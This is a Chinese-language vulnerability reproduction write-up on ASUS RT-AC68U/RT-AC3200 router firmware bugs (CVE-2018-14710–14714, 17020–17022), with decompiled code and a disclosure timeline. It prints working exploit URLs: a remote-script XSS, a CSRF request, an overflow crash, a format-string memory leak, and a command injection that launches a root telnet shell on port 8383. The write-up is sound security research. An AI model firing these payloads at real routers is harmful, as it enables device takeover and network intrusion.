# 华硕RT-AC68U系列漏洞复现（一）
> buggart
> 来源：https://www.iotsec-zone.com/article/45

# 华硕RT-AC68U系列漏洞复现（一）：384-45149——hvidwp

[固件下载](https://www.asus.com.cn/Networking-IoT-Servers/WiFi-Routers/ASUS-WiFi-Routers/RTAC68U/HelpDesk_BIOS/)

![0.png](https://www.iotsec-zone.com/images/MdImg/7e01533cc34261315917738416d552b0.png)

在github上找到了[asuswrt-382的源码](https://github.com/bender647/asuswrt-382)，看一下版本还不算老：`3.0.0.4.382.51640`

# 漏洞分析思路

拿到设备后，看了一下当前版本是：`版本 3.0.0.4.384.32738 `

接下来沿着厂商修复的路径逐一复现其修复的漏洞，以便更好的理解和掌握开发框架。

下一个漏洞修复点为:`版本 3.00.4.384.45149`

![1.png](https://www.iotsec-zone.com/images/MdImg/ac8a640c079b087284a4965b27033f04.png)

# 漏洞逐一复现

接下来逐一对其修复的漏洞进行复现。

## 0x01:CVE-2018-14710~CVE-2018-14714

CVE官网上对14710这个CVE的描述为：

```
Description 
Cross-site scripting in appGet.cgi on ASUS RT-AC3200  version 3.0.0.4.382.50010 allows attackers to execute JavaScript via the "hook" URL parameter. |
```

意思是攻击者可以通过appGet.cgi的url参数hook来执行javascript。

14711：

```
Description
Missing cross-site request forgery protection in  appGet.cgi on ASUS RT-AC3200 version 3.0.0.4.382.50010 allows attackers  to cause state-changing actions with specially crafted URLs. |
```

攻击者构造特殊的urls可以更改状态。

14712:

```
Description 
Buffer overflow in appGet.cgi on ASUS RT-AC3200  version 3.0.0.4.382.50010 allows attackers to inject system commands via the "hook" URL parameter.
```

还可以通过缓冲区溢出造成命令注入。

14713:

```
Description
Format string vulnerability in appGet.cgi on ASUS  RT-AC3200 version 3.0.0.4.382.50010 allows attackers to read arbitrary  sections of memory and CPU registers via the "hook" URL parameter. 
```

存在格式化字符串漏洞可以读取内存。

14714:

```
Description
System command injection in appGet.cgi on ASUS  RT-AC3200 version 3.0.0.4.382.50010 allows attackers to execute system  commands via the "load_script" URL parameter. 
```

通过url参数"load_script"来进行命令注入。

这一系列漏洞都是围绕appGet.cgi的hook参数来进行的，开始是在ASUS RT-AC3200 上发现的

官网下载固件，定位appGet.cgi这个接口。

### **CVE-2018-14710**

当`/appeGet.cgi`调用不存在的hook函数时，会反射用户的输入。攻击者可以利用这个进行XSS攻击，只需要注意URL长度限制和字符过滤。

我们注意这边的处理逻辑，在handle_request中会依次在mime_handlers列表中对cgi进行匹配。

![2.png](https://www.iotsec-zone.com/images/MdImg/8aa91c27b89886a90b1eaa3fa6e241cc.png)

列表保存了对应的六元组结构体，保存了匹配字符串、成员类型、输入函数、输出函数、认证函数等信息。

![3.png](https://www.iotsec-zone.com/images/MdImg/f8b3c6ea6465a4a90552cdf4bc7a999d.png)

在匹配到对应项后，会调用output成员函数进行处理，并传入conn_fp，是通过fdopen使一个标准的I / O流与网络套接字的描述符相结合而来的。

![4.png](https://www.iotsec-zone.com/images/MdImg/29c30d8fd38248e04fa638da920fc996.png)
如果访问appGet.cgi，会使用do_appGet_cgi函数进行对应的处理。

对左右括号中的内容进行了提取，并做了相应截断，保存在argv中。

![5.png](https://www.iotsec-zone.com/images/MdImg/570ef11d3ef6f3a85cb8420236f1f413.png)

并将hook后跟的函数名与传入参数直接以\%s-%s\的形式写入。fflush清除缓冲区，立即把输出缓冲区的数据进行物理写入。

![6.png](https://www.iotsec-zone.com/images/MdImg/75544853e25756af959aced310c04a9f.png)

在do_appGet_cgi中也会从ej_handlers这个列表对hook后跟的函数名进行匹配，如果匹配成功，会调用对应的处理函数。

但是没有找到对应函数时，就会将hook后面的内容返回给用户。

![7.png](https://www.iotsec-zone.com/images/MdImg/07574926ab685bb6f7e7f1bac4faa915.png)

常规的我们设计一个弹窗，但这边被过滤掉了，因为前面会提取左右的括号，这里可以设置src标签来部署我们的js脚本在远端上。

我这里用python自带的服务器开启放了一个test.js里面放了个alert弹窗。

```url
http://192.168.1.1/appGet.cgi?hook=bork(<script+src%3dhttp%3a//192.168.1.6%3a8000/test.js>ono</script>)
```

![8.png](https://www.iotsec-zone.com/images/MdImg/ef1d5de4eaf3900e61c77a03e0684f2f.png)
成功弹窗。

![9.png](https://www.iotsec-zone.com/images/MdImg/39cb3c233846bcc5987d3aa74e6df309.png)

这样一来就可以运行自己的脚本。

### **CVE-2018-14711**

/appGet.cgi缺乏任何类型的跨站点请求伪造(CSRF)保护。因此可以通过设置钓鱼强迫用户来在没有戒备的状态下发出一些请求。例如诱使使用者跳转到如下URL更改系统区域设置。

```
http://192.168.1.1/appGet.cgi?hook=select_channel("US")
```

### **CVE-2018-14712**

/appGet.cgi中delete_sharedfolder中存在堆栈缓冲区溢出。

这个溢出发生在函数的libdisk.so中。构造如下url会导致httpd程序崩溃，导致web界面无法访问。这个只能在LAN口被利用，但是如果启用了远程管理，也能在WAN口利用。

```
http://192.168.1.1/appGet.cgi?hook=delete_sharedfolder()&folder=A&pool=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

在delete_sharedfolder中通过websGetVar获取folder和pool，并使用get_mount_path来处理pool。

```c++
  pool = websGetVar("pool", a2, a3);
  if ( pool )
    pool_1 = pool;
  else
    pool_1 = "";
  folder = websGetVar("folder", v5, v6);
  if ( folder )
    folder_1 = folder;
  else
    folder_1 = "";
  ......
  if ( get_mount_path(pool_1, mount_path, 4096) < 0 )
  {
    v10 = a2;
    goto LABEL_11;
  }
```

在libdisk.so中，get_mount_path实质转到read_mount_data中。

```
char *__fastcall read_mount_data(const char *pool, void *mount_path, signed int path_len, ....)
{
  char v29[24]; // [sp+10h] [bp-1040h] BYREF
  _DWORD v30[4]; // [sp+1010h] [bp-40h] BYREF
  _DWORD v31[12]; // [sp+1020h] [bp-30h] BYREF
...
    v31[0] = 0;
    v31[1] = 0;
    sprintf((char *)v31, "%s ", pool);
...
}
```

sprintf是不安全的，会将pool中的数据写入到v31数组而造成数组越界。

要注意的是设备开启了ASLR，无法直接利用起来进一步获取shell，但是结合cve-2018-14713就能泄露栈上地址，进一步进行利用。

### **CVE-2018-14713**

/appGet.cgi中的nvram_match函数用于匹配检测nvram存储的键值条目是否正确，函数需要3个参数，一个键、一个值、一个输出的字符串，如果键值匹配，会将输出字符串通过printf返回给客户端，这里可以进行格式化字符串内存泄漏。

经过身份验证的攻击者可以提供`printf()`format格式说明符，例如`%p`和`%n`，来泄露堆栈的信息以及任意内存的写入，例如，请求以下 URL 将泄漏寄存器 r2 和 r3 的内容，以及堆栈中的 8 个字节。

```
http://192.168.1.1/appGet.cgi?hook=nvram_match("model","RT-AC68U","%25p%25p%25p%25p")
```

![10.png](https://www.iotsec-zone.com/images/MdImg/dd6f8ea3890ef1ab77bdf1d357730eb8.png)

这里建议找一些容易确定且不容易变化的键值进行内存泄露。

```c++
int __fastcall ej_nvram_match(int eid, FILE *wp, int argc, int argv)
{
  int v5; // r5
  char *output; // [sp+Ch] [bp-1Ch] BYREF
  const char *match; // [sp+10h] [bp-18h] BYREF
  int name; // [sp+14h] [bp-14h] BYREF

  if ( ejArgs(argc, argv, "%s %s %s", (const char *)&name, (const char *)&match, (const char *)&output) > 2 )
  {
    v5 = nvram_match(name, match);//使用nvram_get获取键值和match进行比对，相同则返回1
    if ( v5 )
    {
      v5 = fprintf(wp, output);//匹配成功，使用fprint输出，这里存在格式化字符串漏洞
      fflush(wp);
    }
  }
  else
  {
    fputs("Insufficient args\n", wp);
    v5 = -1;
  }
  return v5;
}
```

### **CVE-2018-14714**

/appGet.cgi提供了一个load_script的hook，用来运行某些内置脚本。

```
http://192.168.1.1/appGet.cgi?hook=load_script("../usr/sbin/telnetd+-l+/bin/sh+-p+8383")
```

端点 at`/appGet.cgi`提供了一个`load_script`钩子，它允许运行某些内置脚本。但是，服务器不会验证或清理用户输入，从而导致能够在路由器上运行任意系统命令。下面提供了一个利用此漏洞的示例 URL。当经过身份验证的用户请求时，路由器将在端口 8383 上以 root 身份启动 telnetd 实例。

```c++
char *__fastcall sys_script(const char *name)
{
  char *result; // r0
  const char *v3; // r0
  int v4[64]; // [sp+0h] [bp-150h] BYREF
  char scmd[80]; // [sp+100h] [bp-50h] BYREF

  sprintf(scmd, "/tmp/%s", name);//将script_name与/tmp拼接，生成scmd
  if ( !strcmp(name, "syscmd.sh") )
  {
    if ( !byte_9BA44 )
      return (char *)f_write_string("/tmp/syscmd.log", "", (unsigned __int8)byte_9BA44, (unsigned __int8)byte_9BA44);
    snprintf((char *)v4, 0x100u, "%s > /tmp/syscmd.log 2>&1 && echo 'XU6J03M6' >> /tmp/syscmd.log &\n", &byte_9BA44);
    system((const char *)v4);
    return strcpy(&byte_9BA44, "");
  }
  if ( !strcmp(name, "eject-usb.sh") )
  {
    v4[0] = (int)"rmstorage";
    goto LABEL_16;
  }
  if ( !strcmp(name, "ddnsclient") )
  {
    v3 = "restart_ddns";
    return (char *)notify_rc(v3);
  }
  if ( strstr(name, "asusddns_register") )
  {
    v3 = "asusddns_reg_domain";
    return (char *)notify_rc(v3);
  }
  result = (char *)strcmp(name, "leases.sh");
  if ( result )
  {
    result = (char *)strcmp(name, "dleases.sh");
    if ( result )
    {
      if ( strchr(scmd, ' ') )				//当不满足以上的匹配条件，检测到有空格，就执行
        return (char *)system(scmd);
      v4[0] = (int)scmd;
LABEL_16:
      v4[1] = 0;
      return (char *)((int (__fastcall *)(int *, _DWORD, _DWORD, _DWORD))eval)(v4, 0, 0, 0);
    }
  }
  return result;
}
```

所以可以设计`../usr/sbin/`去访问telnetd服务，指定端口，开启telnet服务。

### 披露时间线

- **2018 年 7 月 6 日：**首次披露漏洞。华硕确认收到并要求提供详细信息以进行验证。ISE 提供了更多详细信息。
- **2018 年 7 月 10 日：**华硕确认错误是可重现的。
- **2018 年 7 月 16 日：**华硕向 ISE 发送测试版固件更新，并要求 ISE 验证缓解措施。
- **2018 年 8 月 22 日**：ISE 同意测试固件。
- **2018 年 10 月 1 日至 3 日：** ISE 确认漏洞已得到解决，并将其传达给华硕。
- **2018 年 11 月 8 日：** ISE 询问华硕计划何时发布 RT-AC3200 更新，因为即将发布。

### 小结

在实际复现的过程中，虽然公告是在`3.0.0.4.384.45149`中修复了这些漏洞，但实际是在`3.0.0.4.384.32738` 就尝试进行了部分修复，所以我们实际复现是在更早些的版本`3.0.0.4.384.10007`。开发者在设计时没有充分考虑安全性，对于脚本执行、命令执行、栈溢出、格式化字符串、跨站执行等没有充分考虑。建议设置一些命令执行的字符过滤，换用snprintf这类更加安全的函数。

## 0x02:CVE-2018-17020~CVE-2018-17022

CVE官网：

```
CVE-ID:CVE-2018-17020
Description：ASUS GT-AC5300 devices with firmware through 3.0.0.4.384_32738 allow  remote attackers to cause a denial of service via a single "GET /  HTTP/1.1\r\n" line.
```

可以通发送Get包造成拒绝服务攻击。

```
CVE-ID:CVE-2018-17021
Description:Cross-site scripting (XSS) vulnerability on ASUS GT-AC5300 devices with  firmware through 3.0.0.4.384_32738 allows remote attackers to inject  arbitrary web script or HTML via the appGet.cgi hook parameter.
```

可以通过appGet.cgi注入任意Web或HTML

```
CVE-ID:CVE-2018-17022
Description:Stack-based buffer overflow on the ASUS GT-AC5300 router through  3.0.0.4.384_32738 allows remote attackers to cause a denial of service  (device crash) or possibly have unspecified other impact by setting a  long sh_path0 value and then sending an  appGet.cgi?hook=select_list("Storage_x_SharedPath") request, because  ej_select_list in router/httpd/web.c uses strcpy. 
```

select_list()内使用strcpy，造成栈溢出。

### CVE-2018-17020

拒绝服务攻击，没什么好说的。

### CVE-2018-17021

这个XSS应该和CVE-2018-1470是同一个。

### CVE-2018-17022

在/appGet.cgi中设置hook=select_list("Storage_x_SharedPath")请求，通过里面的strcpy造成溢出。

```
http://192.168.1.1/appGet.cgi?hook=select_list("Storage_x_SharedPath")
```

这个漏洞在AC68U中实际没有select_list这个接口，不过在ac3200中倒是存在这个接口的漏洞。

```c++
  char v24[64]; // [sp+8h] [bp-F8h] BYREF
  char s[64]; // [sp+48h] [bp-B8h] BYREF
  char dest[64]; // [sp+88h] [bp-78h] BYREF
......
if ( !strcmp(args, "Storage_x_SharedPath") )
  {
    v7 = nvram_get_int("sh_path_x");
    sprintf(v27, "%d", v7);
    v8 = sub_12164("sh_path", (int)v27, s);
    sh_path = (const char *)nvram_get(v8);		//获取sh_path
    strcpy(v24, sh_path);					//存在栈溢出风险
    strcpy(dest, v24);
    v10 = fprintf(wp, dest);
LABEL_9:
    v5 = v10;
    fflush(wp);
    return v5;
  }
```

### 小结

因为修复时间线的问题，这三个漏洞在AC68U上没有很强烈的体现。
